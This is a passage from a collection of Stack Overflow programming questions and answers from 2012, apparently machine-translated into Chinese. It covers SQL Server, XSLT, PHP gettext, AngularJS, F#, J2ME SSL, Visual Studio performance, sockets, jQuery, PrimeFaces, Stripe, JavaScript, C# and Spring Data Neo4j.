        if(WaitForSingleObject(m_ePipeStart, 5000)==WAIT_OBJECT_0)
            break;
    }
    BYTE buf[PIPESIZE];

    while(1)
    {
        memset(buf, 0, PIPESIZE);

        DWORD dwRead;

        if( ReadFile(hPipe,buf,10,&dwRead,NULL) )
        {
            if(m_pPipeRead == NULL)
            {
                m_pPipeRead = (BYTE*) malloc(dwRead);
            }else
            {
                m_pPipeRead = (BYTE*) realloc( m_pPipeRead, dwRead + sum );
            }

            memcpy(m_pPipeRead+sum, buf, dwRead);

            sum+=dwRead;
        }
        if(WaitForSingleObject(m_ePipeEnd, 0)==WAIT_OBJECT_0)
            break;
    }
    return 1;
} 
```

# sql - 如何在 SQL Server 中比较 time(7)？

> ID：13841892
> 
> 赞同：1
> 
> 时间：2012-12-12T14:31:11.547
> 
> 标签：sql, sql-server

我有一个选择语句::

```
 SELECT [Course ID], [Course name] 
FROM Courses 
WHERE [Course ID] NOT IN 
(SELECT [Course ID] from student_courses sc
  INNER JOIN Courses c ON sc.[course ID] = c.[course ID] 
  WHERE [student ID] = 1
  AND (c.[course start time] not BETWEEN Courses.[course start time] AND Courses.[course end time]
  OR c.[course end time] not BETWEEN Courses.[course start time] AND Courses.[course end time])) 
```

它不断给出以下错误::

> *数据类型日期和时间在小于或等于运算符中不兼容....*
> 
> *不明确的列名称“课程 ID”*

如何修复这些错误并实际比较数据类型的列`time(7)`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:37:56.963

您需要将日期转换为时间，即

```
CAST(<YOUR DATE> AS time(7)) 
```

并且要摆脱模棱两可的列，您需要在表中添加一个别名，因为 student_courses 和 course 都有`courseId`。

如果不运行它，问题看起来像它在子查询中

```
select **c.[Course ID]** from student_courses sc inner join Courses c on sc.[Course ID] = c.[Course ID]
    where [student ID]=@val1
    AND ((c.[Course start date] between Courses.[Course start date] and Courses.[Course end time])
    or (c.[Course end time] between Courses.[Course start time] and Courses.[Course end time]) 
    ) 
```

# xml - 从 XML 中的特定标记在 XSL 中创建全局变量

> ID：13841894
> 
> 赞同：2
> 
> 时间：2012-12-12T14:31:18.730
> 
> 标签：xml, xslt, xslt-1.0

我在 XSL 1.0 样式表中创建全局变量时遇到问题。我想从我试图转换的 XML 中的 XML 标记的值创建变量。这是我的 XML 的样子：

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>

<config name="test report" xmlns="http://www.example.com/CONFIG">

    <the_one_i_want>1000</the_one_i_want>

    <!-- lots of other stuff -->

</config> 
```

这是我的 XSL 的样子：

```
<?xml version="1.0" encoding="UTF-8"?>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:CONFIG="http://www.example.com/CONFIG">

    <xsl:output method="html"/>

    <xsl:variable name="normal_global_variable">100</xsl:variable><!-- This works fine -->
    <xsl:variable name="variable_from_xml"><xsl:value-of select="/config/the_one_i_want/value"/></xsl:variable><!-- This does not work -->

    <!-- lots of other stuff -->

</xsl:stylesheet> 
```

所以我希望它`variable_from_xml`的值为`1000`，但事实并非如此。我究竟做错了什么？

**PS**命名的 XML 标记`the_one_i_want`是唯一的，在我的 XML 中只出现一次。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:48:17.877

问题是名称空间之一。`<the_one_i_want>`您所追求的元素绑定到`http://www.example.com/CONFIG`名称空间（您已在 XSLT 中定义）。

**因此，只需更改以下内容：**

```
<xsl:variable name="variable_from_xml">
  <xsl:value-of select="/config/the_one_i_want/value"/>
</xsl:variable> 
```

**对此：**

```
<xsl:variable name="variable_from_xml" select="/CONFIG:config/CONFIG:the_one_i_want"/> 
```

**或者，更简单地说：**

```
<xsl:variable name="variable_from_xml" select="/*/CONFIG:the_one_i_want"/> 
```

# php - 无法使用 gettext 进行翻译

> ID：13841895
> 
> 赞同：0
> 
> 时间：2012-12-12T14:31:22.907
> 
> 标签：php, internationalization, gettext

我无法翻译我网站上的任何内容。为了调试（在我的本地服务器上），我把这个

```
 bindtextdomain("mysite", "../locale"); //path is correct
    bind_textdomain_codeset("mysite", 'UTF-8');
    textdomain("mysite");
    @setlocale(LC_ALL, 'en_US');
    echo gettext("mon site");//keeps returning 'mon site' 
```

知道了，我生成了正确的 mysite.mo（在相对路径 ./locale/en_US/LC_MESSAGES/ 中），其中翻译“mon site”显示为“my site”

我可以使用'putenv'来调试它，是否可以不使用它？

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:43:22.760

您的计算机上是否安装了语言 en_US？

看到这个问题：[PHP web application internationalization with Gettext();](https://stackoverflow.com/questions/11974133/php-web-application-internationalisation-with-gettext)

您必须在计算机上安装该语言才能正确编译 .mo 并能够使用它们

# angularjs - 更新模型时渲染方法未触发

> ID：13841896
> 
> 赞同：1
> 
> 时间：2012-12-12T14:31:23.810
> 
> 标签：angularjs

基本上我正在创建一个字符计数器，它有 2 个输入字段来填写模板。问题是其中 1 个字段是可选的，并且如果选中，则具有添加到字符计数的样板文本。所以我最大的问题是在两个输入区域中获取字符串的长度。模型更改时，渲染方法未运行。我很困惑为什么会这样。

```
var $scope;
var app = angular.module('miniapp', []);

function Ctrl($scope) {
    $scope.form = {}
}

app.directive('charcount', function(){
    return {
        restrict: 'E',
        require: 'ngModel',
        link: function (scope, el, attrs, controller){
            controller.$render = function(){
                var data = controller.$modelValue
                var codeLen = 0, descLen = 0;
                if (data.code){
                  codeLen = data.code.length
                }
              if (data.desc){
                descLen = data.desc.length
              }  
                console.log(descLen, codeLen);                      
            }            
        }
    }
}) 
```

小提琴：http: [//jsfiddle.net/dj6mX/481/](http://jsfiddle.net/dj6mX/481/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:53:39.583

我从未使用过*$render*但我使用 ng-change 在*textInput*上调用函数并创建*countChange*函数来计算文本长度。

HTML 中的示例

```
<div ng-app="miniapp">
  <div ng-controller="Ctrl">
    <form>
      <label for="desc">Description</label>
      <textarea ng-change="countChange()" id="desc" ng-model="form.desc"></textarea>
      <charcount ng-model="form">
      <label for="code">Code</label>
      <input id="code" ng-change="countChange()" ng-model="form.code"/>               
    </form>
    <p id="preview">Some filler text here user input {{form.desc}}
      <span ng- show="form.code">
        Some optional text here plus code {{form.code}}
      </span>
    </p>
  </div>
</div>​ 
```

在指令中

```
var app = angular.module('miniapp', []);

function Ctrl($scope) {

}

app.directive('charcount', function(){
    return {
        restrict: 'E',
        require: 'ngModel',
          controller: function($scope) {            
                $scope.countChange= function() {
                    var codeLen = 0;
                    var descLen = 0;                     
                    if($scope.form.desc){
                    descLen = $scope.form.desc.length;
                    }
                    if($scope.form.code){
                    codeLen = $scope.form.code.length;
                    }
                   console.log(codeLen,descLen);     
                }

            },        
        link: function (scope, el, attrs, controller){

        }       
 }}) 
```

对不起，我的英语不好，但我希望这会对你有所帮助。XD

# f# - 在有区别的联合类型声明中使用活动模式

> ID：13841897
> 
> 赞同：5
> 
> 时间：2012-12-12T14:31:26.650
> 
> 标签：f#, discriminated-union, active-pattern

是否可以在有区别的联合类型声明中使用活动模式？

更准确地说，考虑以下玩具示例：

```
type T = 
    | A of int
    | B

let (|Negative|_|) t = 
    match t with
    | A n when n < 0 -> Some ()
    | _ -> None

let T_ToString = function
    | Negative () -> "negative!"
    | _ -> "foo!" 
```

现在假设我想覆盖 T 中的 ToString()。在 T 的类型声明中，我不能引用 T_ToString，因为此时尚未声明 T_ToString。我无法在 ToString() 之前移动活动模式和 T_ToString ，因为此时尚未声明 T 。但这也不起作用：

```
type T = 
    | A of int
    | B

    static member (|Negative|_|) t = 
        match t with
        | A n when n < 0 -> Some ()
        | _ -> None

    override this.ToString () = 
        match this with
        | Negative () -> "negative!"
        | _ -> "foo!" 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T15:22:45.407

您的问题表明，阴性测试是 的内在操作`T`，因此它应该是其定义的一部分。定义属性是一种方法：

```
type T = 
  | A of int
  | B

  member this.IsNegative = 
    match this with
    | A n -> n < 0
    | _ -> false

  override this.ToString() = 
    if this.IsNegative then "negative!"
    else "foo!" 
```

我不确定是否仍然需要活动模式，但如果它是微不足道的：

```
let (|Negative|_|) (x: T) = if x.IsNegative then Some() else None 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T14:49:34.373

这不是最好的解决方案，但您可以这样做：

```
type T = 
    | A of int
    | B

    static member internal ActivePattern t =
        match t with
        | A n when n < 0 -> Some ()
        | _ -> None

    override this.ToString () = 

        let (|Negative|_|) = T.ActivePattern

        match this with
        | Negative () -> "negative!"
        | _ -> "foo!"

let (|Negative|_|) = T.ActivePattern 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-12T14:43:07.160

好的，我想我找到了一个解决方案：首先声明类型，然后在它之外声明活动模式，最后使用 ToString() 的覆盖实现来增加类型。

```
type T = 
    | A of int
    | B

let (|Negative|_|) t = 
    match t with
    | A n when n < 0 -> Some ()
    | _ -> None

type T with
    override this.ToString() = 
        match this with
        | Negative () -> "negative!"
        | _ -> "foo!" 
```

但是，这不是很好，因为我收到了警告

```
warning FS0060: Override implementations in augmentations are now deprecated. Override implementations should be given as part of the initial declaration of a type. 
```

# ssl - 为什么 WTK 不允许我与某些可从浏览器访问的 URL 建立 https 连接

> ID：13841899
> 
> 赞同：1
> 
> 时间：2012-12-12T14:31:30.283
> 
> 标签：ssl, java-me, java-wireless-toolkit

我正在尝试在 j2me 中获取 httpsConnection（下面我的配置的某些部分<如果需要更多，我可以提供更多）

```
<j2me.midlet.configuration>CLDC-1.1</j2me.midlet.configuration>
<j2me.midlet.profile>MIDP-2.0</j2me.midlet.profile> 
```

WTK 是 2.5.2_01

```
HttpsConnection connection = (HttpsConnection)Connector.open("https://myURL/user/login", Connector.READ);` 
```

在 connection.open() 我得到

```
[WtkRun] javax.microedition.pki.CertificateException: Certificate in a chain was not issued by the next authority in the chain
   [WtkRun]     at com.sun.midp.ssl.X509Certificate.verifyChain(+115)
   [WtkRun]     at com.sun.midp.ssl.Handshake.parseChain(+111)
   [WtkRun]     at com.sun.midp.ssl.Handshake.rcvCert(+114)
   [WtkRun]     at com.sun.midp.ssl.Handshake.doHandShake(+96)
   [WtkRun]     at com.sun.midp.ssl.SSLStreamConnection.<init>(+173)
   [WtkRun]     at com.sun.midp.ssl.SSLStreamConnection.<init>(+12)
   [WtkRun]     at com.sun.midp.io.j2me.https.Protocol.connect(+214)
   [WtkRun]     at com.sun.midp.io.j2me.http.Protocol.streamConnect(+57)
   [WtkRun]     at com.sun.midp.io.j2me.http.Protocol.startRequest(+12)
   [WtkRun]     at com.sun.midp.io.j2me.http.Protocol.sendRequest(+38)
   [WtkRun]     at com.sun.midp.io.j2me.http.Protocol.sendRequest(+6)
   [WtkRun]     at com.sun.midp.io.j2me.http.Protocol.openInputStream(+9)
   [WtkRun]     at nkclause.PostClause.a(+162)
   [WtkRun]     at nkclause.PostClause.startApp(+473)
   [WtkRun]     at javax.microedition.midlet.MIDletProxy.startApp(+7)
   [WtkRun]     at com.sun.midp.midlet.Scheduler.schedule(+270)
   [WtkRun]     at com.sun.midp.main.Main.runLocalClass(+28)
   [WtkRun]     at com.sun.midp.main.Main.main(+80) 
```

我已经设法获得证书详细信息，所以它的颁发者是

```
[WtkRun] C=US;O=Thawte, Inc.;CN=Thawte SSL CA 
```

并且浏览器存储中存在相同的发行者；我可以毫无问题地访问 URL。

我也尝试过一些技巧，比如

```
connection = (StreamConnection) Connector.open("https://myURL/user/login:443;CertificateErrorHandling=warn;HandshakeCommentary=on", Connector.READ); 
```

但例外仍然相同。

我正在寻求处理此案的方法：1）可能是 WTK 模拟器不知道链中的第二个权限。在浏览器中，我可以直观地检查证书颁发者，但是如何在 wtk 中进行 int 操作？2）有没有办法忽略ssl证书问题？旧的答案说不，但自那时以来可能发生了一些变化？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T21:53:25.550

自从我专门研究 wtk 仿真器以来已经有一段时间了，但是如果您只是需要它进行仿真，我相信您只需将证书添加到您的 java 钥匙串中，它就会被接受。由于 WTK 不需要可用的 J2SE VM，因此您可能不会谈论 J2SE 密钥工具。

我的第一步是查看 ${WTK_LOCATION}/bin/mekeytool。对于不同的手机，您将做不同的事情来接受自定义证书，因此该解决方案可能非常特定于手机。

我很确定在 J2ME 中以编程方式忽略证书没有任何改变。如果你想这样做，为什么不直接使用 http 而不是 https？

# c++ - 在 Visual Studio 中发布版本 Ctrl+F5 比从外部 VS 慢 10 倍

> ID：13841902
> 
> 赞同：8
> 
> 时间：2012-12-12T14:31:41.813
> 
> 标签：c++, visual-studio, visual-studio-2008

我有一个中型原生 C++ 应用程序。当我从 Visual Studio (2008) 中运行它时，它的运行速度比从 Visual Studio 外部运行时慢大约 10 倍。这适用于 Debug 和 Release 版本，并且在我以`Start Debugging`(F5) 和`Start Without Debugging`(Ctrl+F5) 运行应用程序时都会发生。

换句话说：在**没有**调试器的情况下在 Visual Studio 中运行发布版本比从命令提示符（或 Windows 资源管理器）运行相同的可执行文件慢 10 倍。

我尝试过的事情：

*   仔细检查没有设置断点、跟踪点、异常调试等。没有。
*   在应用程序的 VS 调试属性中设置`_NO_DEBUG_HEAP=1`。没有效果。
*   设置`cmd /c set PATH`为由 Ctrl+F5 而不是应用程序本身运行，并将其与`PATH`VS 外部可用的情况进行比较。没有不同。
*   在 exe 上运行 DependencyWalker，并将其与运行应用程序时加载的 Visual Studio 列出的库进行比较。没有不同。
*   谷歌搜索和搜索，但这只是提出了上述想法或处理了 F5 与 Ctrl+F5 的差异（在我的情况下没有）。

我已经没有想法了，如果有任何关于在哪里寻找或尝试什么的指示，我将不胜感激。

该应用程序使用 OpenGL 和 Qt，并且做相当普通的事情：没有加载/卸载 DLL，仅在启动时输入文件（3D 模型和着色器），没有文件输出，很少的第 3 方库（除了 Qt，所有这些都是静态链接的） .

雪上加霜，我只是在最近对应用程序进行内部重构后才开始遇到这种行为。在此之前，它在 VS 内外都运行良好。这次重构主要是把一些功能提取到一个新创建的基类中（即把`A > B`继承改成`A > C > B`继承，涉及的虚调用很少），并`new[]`用 s 替换了一些调用`std::vector`。

**编辑**

我又尝试了一件事：在应用程序的调试属性中，将目标设置为`cmd /k`，然后执行 Ctrl+F5 以启动`cmd`并从该命令行运行应用程序。这样，它以正常速度运行（即不存在 10 倍减速）。当然，这对于调试毫无用处，但出于完整性的考虑，我想提一下。

**编辑 2**

我找到了：这是对工作目录的奇怪依赖。如果从 .vcproj 所在的目录开始（VS 通常使用 F5 和 Ctrl+F5），目录中的相对路径将存在，并且调试输出（我忘记了它的存在）成功，从而减慢了运行速度。从任何其他目录执行会导致输出失败，从而加快执行速度。

我向所有为此花费时间的人道歉。投票结束。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T04:41:08.703

根据我的经验，它与低碎片堆有关。但是你说你设置了_NO_DEBUG_HEAP=1，所以我不知道这是否是正确的答案，我想你至少可以试一试。

低碎片堆 (LFH) 有助于减少堆碎片，启用后，如果您的应用程序使用大量内存分配，它可以提高应用程序的性能，速度提高 10 倍。

从 Windows Vista 开始默认启用 LFH，但是，当进程在任何调试器下运行时，会自动为进程中的所有堆启用某些堆调试选项。这些堆调试选项阻止使用 LFH。

这解释了为什么如果从 VS 启动应用程序运行速度会慢 10 倍。（我过去遇到过同样的问题）。您可以使用函数[HeapQueryInformation](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366703%28v=vs.85%29.aspx)来获取堆信息并输出它来验证是否是由禁用 LFH 引起的。

有关 LFH 的详细信息，请参阅以下两篇文章：

1.  [低碎片堆](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366750%28v=vs.85%29.aspx)
2.  [HeapSetInformation 函数](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366705%28v=vs.85%29.aspx)

论坛上有一篇类似的帖子：[为什么我连接了调试器/IDE 后我的 STL 代码运行如此缓慢？](https://stackoverflow.com/questions/1060337/why-does-my-stl-code-run-so-slowly-when-i-have-the-debugger-ide-attached)

# c - 检查非阻塞发送是否成功

> ID：13841906
> 
> 赞同：5
> 
> 时间：2012-12-12T14:31:52.793
> 
> 标签：c, sockets, io

我正在一个套接字上进行一个非阻塞发送调用，然后在另一个套接字上进行阻塞接收。之后我想检查非阻塞发送是成功还是失败。如何才能做到这一点？

```
 while (i)
    {
      retval = send (out_sd, s_message, strlen (s_message), MSG_DONTWAIT);
      retval = recv (client_sd, r_message, MSG_LEN, 0);
      r_message[retval] = '\0';
      /* Here I want to wait for the non-blocking send to complete */
      strcpy (s_message, r_message);
      strcpy (r_message, "");
      i--;
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T14:49:32.183

您以某种方式混合了同步和异步 IO，这通常有点令人困惑，但我在这里看不到任何实际问题。

为避免硬轮询（不断查看您的操作是否已在循环中完成），您应该使用 select() 等待您的通道/套接字可用于更多写入操作。这将告诉您前一个已完成（或者它已完全由您的操作系统负责，这是相同的）。

[select() 函数是 C 中异步 IO 的基础，您应该在此处](http://linux.die.net/man/2/select)阅读它，[这](http://www.gnu.org/software/libc/manual/html_node/Waiting-for-I_002fO.html)是一个我认为可能对您有用的示例。

请注意，尽管 select() 支持读取、写入和异常事件，示例显示了读取选择，您想要执行写入选择。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:55:04.010

`send()` will return you the number of bytes sent or `-1` in case of an error.

If there's enough buffer in the network stack to send at least some bytes from your message, `retval` will contain the number of bytes sent, which may be less than the number of bytes you wanted to send. If the network stack buffer is full, it will contain `-1` and `errno` will be set to `EAGAIN` or `EWOULDBLOCK`.

In all cases, the send call is complete as soon as it returns. So you do not have to wait for the non-blocking send to complete anywhere else, you need to check the return value right away after the send() call returns.

# javascript - 复选框无法在html页面中显示

> ID：13841907
> 
> 赞同：0
> 
> 时间：2012-12-12T14:31:54.030
> 
> 标签：javascript, jquery, dom

我正在使用 dom 概念构建一个 html 页面，但该复选框未显示在 html 页面中。我的代码如下。

```
if (condition <= 0) {
 $doc = $(document.createElement("li")).attr({
     id: id,
     name: name,
     'class': 'liBullet'
 })
}

else {
 $doc = $(document.createElement("ul")).attr({
     id: id,
     name: name,
     'class': 'liBullet'
 })
}

$doc.append(
    $(document.createElement("input")).attr({
     id: id,
     type: "checkbox",
     name: name,
     'class': 'layerCheck'
    })

    .append(
        $(document.createElement("label")).attr({
          id: id,
          name: name
        })
    ).text(name)

    .append(
        $(document.createElement("div")).attr({
         id: id,
         'class': 'loadingLegend'
        })
    )).appendTo("#layer_list");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:34:34.720

```
$(document.createElement("input")).attr({
                                     id: layer.id,
                                     type: "checkbox",
                                     name: layer.name, // <---- missing comma?
                                     'class': 'layerCheck'
                                 }); // <-- or missing semicolon? 
```

另外，你不需要使用`createElement`，你可以这样做：

```
$("<input />").attr({
                       id: layer.id,
                     type: "checkbox",
                     name: layer.name,
                  'class': 'layerCheck'
              }).appendTo("body"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:42:31.263

你也可以使用这个：

```
$("<input type='checkbox' id='id' name='name' value='val'/>").appendTo("body"); 
```

或者

```
$("body").append("<input type='checkbox' id='id' name='name' value='val'/>"); 
```

阅读关于[append](http://api.jquery.com/append/)和[appendTo](http://api.jquery.com/appendTo/)

# java - 如何在 Primefaces 手风琴选项卡上设置 tabindex

> ID：13841908
> 
> 赞同：0
> 
> 时间：2012-12-12T14:31:55.400
> 
> 标签：java, jquery

有谁知道如何将 tabindex 设置为 Primeface 手风琴面板选项卡。喜欢

```
<p:accordionPanel tabindex="6" autoHeight="false" >
    <p:tab title="tab1"></p:tab>
    <p:tab title="tab2"></p:tab>
</p:accordionPanel> 
```

我目前正在使用primeface 3.4.2 版，并且手风琴选项卡始终将tabindex 设置为-1。有没有办法更改手风琴标签以从标签中获取输入标签索引？>

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T16:07:49.367

我会说手风琴面板和选项卡上都没有 tabindex。在 PrimeFaces 文档中，没有关于手风琴的 tabindex 的内容。我猜 PF 手风琴不是 HTML 字段（输入）或链接（a），（我会说带有 css 的 div），所以 tabindex 并没有真正意义。恐怕您必须自定义手风琴组件，但我也担心如果 tabindex 不在“HTML 1.0 组件用户可以与之交互”上，则无论如何都无法管理它。希望能帮助到你

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-31T13:42:05.470

[这里](https://stackoverflow.com/questions/16666472/custom-html-tag-attributes-are-not-rendered-by-jsf)的直通解决方案可能至少有助于将选项卡索引设置为选项卡本身

# php - 如何使用 PHP 中的 API 在 Stripe 支付中降级/升级计划？

> ID：13841915
> 
> 赞同：4
> 
> 时间：2012-12-12T14:32:09.367
> 
> 标签：php, stripe-payments

我已经订阅了一个计划。现在我想降级它。那么我应该取消订阅当前的计划吗？退还剩余金额的流程是什么？

我在创建客户的同时创建了客户并订阅了客户进行计划。我没有使用 Charge 类。要退款金额，我们需要charge_id吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-13T08:11:59.073

> 我已经订阅了一个计划。现在我想降级它。退还剩余金额的流程是什么？

从[API 文档](https://stripe.com/docs/api#update_subscription)：

> `POST https://api.stripe.com/v1/customers/{CUSTOMER_ID}/subscription`
> 
> 为客户订阅计划，这意味着客户将从注册开始按月计费。如果客户已有有效订阅，我们会将其更新为新计划，并可选择按比例分摊我们下个月收取的价格，以弥补任何价格变化。

很明显，这就是你想要做的。

> 要退款金额，我们需要charge_id吗？

虽然您可能不需要自己退款，但考虑到更改订阅的工作方式，[退款文档](https://stripe.com/docs/api#refund_charge)说您确实需要收费 ID。

鉴于您的问题的答案完全包含在文档中，我强烈建议您在提出下一个问题之前查看文档。

# javascript - for循环中的关闭>不同的尝试失败

> ID：13841919
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:32:21.903
> 
> 标签：javascript, loops, for-loop, scope, closures

我想在每个第一个元素中创建一个带有索引号的二维数组。

编辑：

到目前为止很多..

@carl：我做了很多函数创建只是为了展示我所做的尝试......

乔霍普金斯的想法导致了这一点：

这有效：

```
$('#create_indexed_array').click(function() {

    var new_array = [[9,9],[9,9],[9,9],[9,9],[9,9]];

    for (var i = 0; i < 5; i++) {

        new_array[i][0] = i;

    }

    alert(JSON.stringify(new_array));

}); 
```

但这不起作用：

```
$('#create_indexed_array').click(function() {

    var new_array = new Array(new Array());

    for (var i = 0; i < 2; i++) {
        new_array[0][i] = ""; // create cols
    } 

    for (var i = 1; i < 5; i++) {
        new_array[i] = new_array[0]; // create rows
    }

    for (var i = 0; i < 5; i++) {
        new_array[i][0] = i; // set index

    }

    alert(JSON.stringify(new_array));

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T16:19:38.477

JavaScript 中没有二维数组，只有数组对象可以包含其他数组对象（但也可以包含其他任何东西）。`new Array(new Array());`不符合您的期望。顺便说一句，您可以使用空数组文字`[]`而不是显式调用构造函数。

```
var new_array = [];
for (var i=0; i<5; i++) {
    // create and add a new subarray explicitly:
    new_array[i] = [];
    // add a value to that subarray:
    new_array[i][0] = i;
    // add other values to the subarray:
    new_array[i][1] = "";
}
// new_array now looks like this:
[[0, ""], [1, ""], [2, ""], [3, ""], [4, ""]]

// You might shorten the whole code by using stuffed literals for the sub arrays:
for (var new_array=[], i=0; i<5; i++)
    new_array[i] = [i, ""]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:51:54.080

尝试这样做

```
for (var i = 0; i < $('#rows').val(); i++) {
    new_array[i][0] = i;
} 
```

'i' 的定义可以在 main 函数的开头完成，因为 for 循环没有关闭。因此，当循环结束时，'i' var 仍然可用。你可以读这本书[http://shop.oreilly.com/product/9780596517748.do](http://shop.oreilly.com/product/9780596517748.do)

# c# - C#中的通用列表数据插入

> ID：13841920
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:32:22.503
> 
> 标签：c#, list, generic-list

我只想将一些数据从数据表插入到列表中。

这是我的课：

```
class WhereColumnValue
{
    private string columnName;

    public string _columnName
    {
        get { return columnName; }
        set { columnName = value; }
    }

    private string setValue;

    public string _setValue
    {
        get { return setValue; }
        set { setValue = value; }
    }

    private bool setValueStatus;

    public bool _setValueStatus
    {
        get { return setValueStatus; }
        set { setValueStatus = value; }
    }
} 
```

现在我有一个 WhereColumnValue 类型的列表。

```
List<WhereColumnValue> lstWhereColumnValue = new List<WhereColumnValue>(); 
```

如何将数据插入到这个 lstWhereColumnValue？

我试过以下代码：

```
foreach (DataRow tmp in dtAllColumnData.Rows)
            {
                lstColumn.Add(tmp["COLUMN_NAME"].ToString());
                lbTableColumns.Items.Add(tmp["COLUMN_NAME"]);
                lstWhereColumnValue.Add(***);

            } 
```

我必须在这里添加一个项目（***）。但我只有_columnValue 的价值。其余两个将保持为空。我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:38:37.303

您需要实例化您的类并将其填充的实例添加到您的列表中。像这样的东西：

```
foreach (DataRow tmp in dtAllColumnData.Rows)
{
    WhereColumnValue val = new WhereColumnValue();
    val._columnName = tmp["COLUMN_NAME"];
    val._setValue = tmp{"SET_VALUE"];
    ....
    lstColumn.Add(val);
} 
```

您可能还希望遵循命名约定并将您的属性设置为 ColumnName、SetValue 等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:38:26.617

```
lstWhereColumnValue.AddRange(
            dtAllColumnData.Rows.Cast<DataRow>()
                           .Select(x => new WhereColumnValue() {_columnName = x["COLUMN_NAME"].ToString()})
                           .ToList()); 
```

解释：

这将迭代 dtAllColumnData 中的所有行，为每一行创建一个新行`WhereColumnValue`并将“Column_Name”的值分配给`_columnName`属性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:38:42.347

那么什么是`lstColumn`和`lbTableColumns`？

既然您已经声明并初始化了 one `List<WhereColumnValue>`，我将使用它：

```
List<WhereColumnValue> lstWhereColumnValue = new List<WhereColumnValue>();
foreach (DataRow tmp in dtAllColumnData.Rows)
{
    WhereColumnValue wcv = new WhereColumnValue{
        _columnName = tmp.Field<string>("COLUMN_NAME") // maybe more fields here
    };
    lstWhereColumnValue.Add(wcv);
} 
```

# neo4j - Spring Data Neo4j 导入时很慢

> ID：13841921
> 
> 赞同：1
> 
> 时间：2012-12-12T14:32:22.610
> 
> 标签：neo4j, spring-data-neo4j

有人可以向我解释为什么将实体导入 Neo4j 需要 6 到 10 秒吗？

我正在使用带有`Neo4jTemplate @Autowire`-d 的自定义存储库的 Spring Data Neo4j。因此，当我坚持一个实体时，我会调用`template.save(entity)`. 我不得不说，虽然实体有点重。它有 47 个属性，即字段，其中 3 个用`@Indexed`注释标记，其中 10 个是用 标记的其他自定义实体`@RelatedTo`。其中 5 个`@RelatedTo`字段是 type `Set`。这意味着实际上在导入这个重实体时，另外 10-15 个实体也可能被持久化并连接到它。

这是实际的问题还是我可以做些什么来加快这个过程？

我环顾四周，找到了，`BatchInserter`但它不关心索引。我找到[了这个](http://code.paananen.fi/2012/04/05/neo4j-batchinserter-and-spring-data-for-neo4j/)示例实现，但如果没有其他选择，我会尝试它。

所以我想我想了解的是，如果沉重的实体是缓慢持续或其他原因的原因。

我正在使用 Neo4j 1.8 并没有触及配置文件。

任何帮助表示赞赏。谢谢。

**编辑**
@Michael Hunger：
- 数据库中的数据量似乎没有影响。
- 我没有使用 AspectJ，所以我想我使用的是简单映射，对吧？你认为我会用 AspectJ 获得更好的性能吗？
- 我认为我没有跨越该`save`方法的外部事务。我正在使用 Wicket Web 应用程序中的数据库。如果我将 Neo4j 的 REST API 与*Jersey* REST 客户端一起使用会更好吗？
- 如果自定义类型的类中有一个属性，例如`Area area`，那么将为此自动创建另一个节点`area`以及主节点和 之间的连接`area`，对吗？所以没有必要`template.createRelationshipBetween(entity1, entity2, type, properties, true)`，对吧？要使用它，我必须做的是删除`area`属性，然后使用一些索引找到正确的`area`，然后手动建立连接。这是你的意思吗？

这就是我的**保存**方法的样子：

```
@Override
@Neo4jTransactional
public <T extends Identifiable> T save(T entity) {
    T saved = template.save(entity);
    Long savedId = saved.getId();
    Node savedNode = getNode(savedId);
    connectToContainerNode(savedNode, entity.getClass());

    return saved;
} 
```

这是如何定义实体的示例（忽略 @ExcelCell 注释）。通常有一个抽象类被持久化实体扩展。如果我做错了什么，请告诉我。

```
@NodeEntity
@SuppressWarnings("rawtypes")
public abstract class Building  implements Identifiable {
    @GraphId private Long id;

    @ExcelCell( type={NewBuilding.class, RefurbishedBuilding.class, ReferenceBuilding.class}, cell=8, sheet=0, row=10)
    @Fetch

    private String concertoId;

    @Fetch
    @Indexed(indexName = "concertoUniqueId", indexType = IndexType.FULLTEXT) 
    private String concertoUniqueId;

    @Fetch
    @Indexed(indexName = "filename", indexType = IndexType.FULLTEXT) 
    private String filename;

    @ExcelCells({
    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=56),
    @ExcelCell( type={ReferenceBuilding.class}, cell=7, sheet=1, row=40),
    @ExcelCell( type={RefurbishedBuilding.class}, cell=8, sheet=1, row=75),
    })
    @Fetch

    private Double floorAreaAccordingToLocalDefinition;

    @Fetch

    private Double formulaCAP;

    @Fetch

    private HashMap formulaEFecmdirectMatrix;

    @Fetch

    private HashMap formulaEFecmindirectMatrix;

    @Fetch

    private Double formulaEM;

    @Fetch

    private Double formulaEN;

    @Fetch

    private Double formulaIN;

    @Fetch

    private HashMap formulaINecaaMatrix;

    @Fetch

    private Double formulaInvestmentAdditionalCosts;

    @Fetch

    private Double formulaInvestmentTotalCosts;

    @ExcelCells({
